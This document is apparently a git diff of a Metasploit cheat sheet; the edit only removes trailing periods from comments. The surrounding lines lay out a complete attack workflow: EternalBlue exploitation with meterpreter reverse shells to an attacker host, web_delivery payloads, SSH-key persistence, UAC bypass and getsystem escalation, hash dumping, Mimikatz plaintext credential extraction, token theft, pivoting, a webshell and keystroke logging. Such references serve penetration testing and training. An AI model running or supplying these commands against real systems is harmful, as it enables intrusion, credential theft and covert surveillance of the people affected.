@@ -21,12 +21,12 @@ msf > db_rebuild_cache
 [*] Purging and rebuilding the module cache in the background...
 
 Wait about 3 min.
-msf > search ms17                             Show all Microsoft exploits released in 2017.
+msf > search ms17                             Show all Microsoft exploits released in 2017
 ------------------------------------------------------------------------------------------------------
 
-service postgrsql start                       Start the PostreSQL db.
-msfconsole                                    Start Metasploit.
-msf > db_status                               Check that you are connected to the db.
+service postgrsql start                       Start the PostreSQL db
+msfconsole                                    Start Metasploit
+msf > db_status                               Check that you are connected to the db
 ------------------------------------------------------------------------------------------------------
 
 # Troubleshooting
@@ -64,17 +64,17 @@ msf > db_status
 db_rebuild_cache                              Rebuilds the database-stored module cache
 ------------------------------------------------------------------------------------------------------
 
-help or ?                                     Show available commands and their descriptions.
-grep -h                                       Show help on the 'grep' command.
+help or ?                                     Show available commands and their descriptions
+grep -h                                       Show help on the 'grep' command
 ------------------------------------------------------------------------------------------------------
 
 # Searching
 
 search <string>
-search ms17                                   Show all Microsoft exploits released in 2017.
+search ms17                                   Show all Microsoft exploits released in 2017
 
 grep <string> search <type>
-grep php search payloads                      Search all payloads, then grep for php.
+grep php search payloads                      Search all payloads, then grep for php
 ------------------------------------------------------------------------------------------------------
 
 # Basic usage
@@ -86,13 +86,13 @@ search ms17_010
 use exploit/windows/smb/ms17_010_eternalblue
 show info
 set rhost <target IP>
-show targets                                  Show OSs that can be targeted with this exploit.
-show payloads                                 Show all payloads that work with this exploit.
+show targets                                  Show OSs that can be targeted with this exploit
+show payloads                                 Show all payloads that work with this exploit
 set payload windows/x64/meterpreter/reverse_tcp
-show options                                  Show remainging options for the payload.
-set lhost <attacker IP>                       Set the listner to the attacker's IP.
-set lport <attacker port>                     Set the listening port to 443.
-exploit                                       Run the exploit.
+show options                                  Show remainging options for the payload
+set lhost <attacker IP>                       Set the listner to the attacker's IP
+set lport <attacker port>                     Set the listening port to 443
+exploit                                       Run the exploit
 
 - If the target is Linux: set AutoRunscript post/linux/manage/sshkey_persistence
 This lets you automatically establish persistence, without having to think about it.
@@ -105,7 +105,7 @@ use exploit/multi/script/web_delivery
 set lhost <attacker IP>
 set lport <attacker port>
 show targets
-set target 2                                  Set the target language to Powershell.
+set target 2                                  Set the target language to PowerShell
 set payload windows/meterpreter/reverse_tcp
 exploit
 
@@ -113,7 +113,7 @@ exploit
 use exploit/multi/script/web_delivery
 set lhost <attacker IP>
 set lport <attacker port>
-set target 0                                  Set the target language to Python.
+set target 0                                  Set the target language to Python
 set payload python/meterpreter/reverse_tcp
 exploit
 ------------------------------------------------------------------------------------------------------
@@ -148,20 +148,20 @@ For example:
    sessions -s checkvm -i 1,3-5
    sessions -k 1-2,5,6
 
-sessions -l                                   Show active sessions.
-sessions -i 2                                 Interact with session 2.
-ctrl z                                        Put the session in the background and go back to the MSF.
+sessions -l                                   Show active sessions
+sessions -i 2                                 Interact with session 2
+ctrl z                                        Put the session in the background and go back to the MSF
 ------------------------------------------------------------------------------------------------------
 
 # Post exploitation - situational awareness
 
-ps                                            Search for a process running as NT AUTHORITY\SYSTEM.
-migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM.
-sysinfo                                       Gets information about the remote system, such as OS.
-getuid                                        Get the user that the server is running as.
-ipconfig                                      Show the target IP.
+ps                                            Search for a process running as NT AUTHORITY\SYSTEM
+migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM
+sysinfo                                       Gets information about the remote system, such as OS
+getuid                                        Get the user that the server is running as
+ipconfig                                      Show the target IP
 
-run get_local_subnets                         Get the local subnets.
+run get_local_subnets                         Get the local subnets
 run post/windows/gather/hashdump
 run post/windows/gather/credentials/credential_collector
 
@@ -179,8 +179,8 @@ reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\
 
 # Escalate privileges
 
-use priv                                      Attempt to elevate to NT AUTHORITY\SYSTEM.
-background                                    If this fails, background the current session and try options. 
+use priv                                      Attempt to elevate to NT AUTHORITY\SYSTEM
+background                                    If this fails, background the current session and try options
 
 --Option 1:
 getsystem
@@ -190,14 +190,14 @@ use exploit/windows/local/bypassuac
 set SESSION 1
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <attacker IP>
-set LPORT 444                                 This MUST be a different port from what was used in the original exploit.
+set LPORT 444                                 This MUST be a different port from what was used in the original exploit
 exploit
 
 --Option 3:
 run post/windows/escalate/getsystem
 getuid
 getsystem
-getuid                                        Privileges should now be NT AUTHORITY\SYSTEM.
+getuid                                        Privileges should now be NT AUTHORITY\SYSTEM
 
 --Option 4:
 use post/windows/escalate/droplnk
@@ -250,10 +250,10 @@ exploit
 
 # Dump hashes
 
-hashdump                                      Try to dump password hashes. If this fails continue.
-ps                                            Show running processes.
-migrate <pid>                                 Migrate to a process running as NT AUTHORITY\SYSTEM.
-hashdump                                      Dump password hashes.
+hashdump                                      Try to dump password hashes. If this fails continue
+ps                                            Show running processes
+migrate <pid>                                 Migrate to a process running as NT AUTHORITY\SYSTEM
+hashdump                                      Dump password hashes
 
 run post/windows/gather/credentials/credential_collector
 run post/windows/gather/credentials/domain_hashdump
@@ -262,9 +262,9 @@ run post/windows/gather/credentials/domain_hashdump
 # View passwords
 
 load kiwi                                     Mimikatz
-lsa_dump                                      Show the current user password in plain text.
-creds_all                                     Show all user passwords in plain text.
-wifi_list                                     Show all wireless networks that have been connected and passwords.
+lsa_dump                                      Show the current user password in plain text
+creds_all                                     Show all user passwords in plain text
+wifi_list                                     Show all wireless networks that have been connected and passwords
 ------------------------------------------------------------------------------------------------------
 
 # Steal tokens to impersonate
@@ -360,7 +360,7 @@ exploit
 
 # Pivoting
 
-ipconfig                                      Look for dual-homed connections.
+ipconfig                                      Look for dual-homed connections
 192.168.0.10
 255.255.255.0
  
@@ -374,8 +374,8 @@ run arp_scanner -r 10.10.10.1/24
 10.0.0.20
 
 meterpreter > background
-route add 10.0.0.1/24 x                       Where x is the meterpreter session ID.
-route print                                   Verify the new route.
+route add 10.0.0.1/24 x                       Where x is the meterpreter session ID
+route print                                   Verify the new route
 
 use auxiliary/scanner/portscan/tcp
 set RHOSTS 10.0.0.0/24
@@ -455,33 +455,33 @@ firefox http://<tartget IP>/webshell.php
 
 # Database
 
-services -p 22                List specific ports.
-services -s http              List specific services.
+services -p 22                List specific ports
+services -s http              List specific services
 
-workspace                     List workspaces.
-* default                     * shows the active workspace.
+workspace                     List workspaces
+* default                     * shows the active workspace
   client1
   client5
 
-workspace client1             Switch workspace.
+workspace client1             Switch workspace
 
-workspace                     List workspaces.
+workspace                     List workspaces
   default
-* client1                     * shows the active workspace.
+* client1                     * shows the active workspace
   client5
 
-workspace -a <name>           Add workspace(s).
-workspace -d <name>           Delete workspace(s).
-workspace -r <old> <new>      Rename workspace.
+workspace -a <name>           Add workspace(s)
+workspace -d <name>           Delete workspace(s)
+workspace -r <old> <new>      Rename workspace
 ------------------------------------------------------------------------------------------------------
 
 # Misc
 
-idletime                      Returns the number of seconds the remote user has been idle.
+idletime                      Returns the number of seconds the remote user has been idle
      if time < 5 min
-     keyscan_start            Start capturing keystrokes.
-     keyscan_stop             Stop capturing keystrokes.
-     keyscan_dump             Dump the keystroke buffer.
+     keyscan_start            Start capturing keystrokes
+     keyscan_stop             Stop capturing keystrokes
+     keyscan_dump             Dump the keystroke buffer
 
 screenshot                    Grab a screenshot of the interactive desktop
 
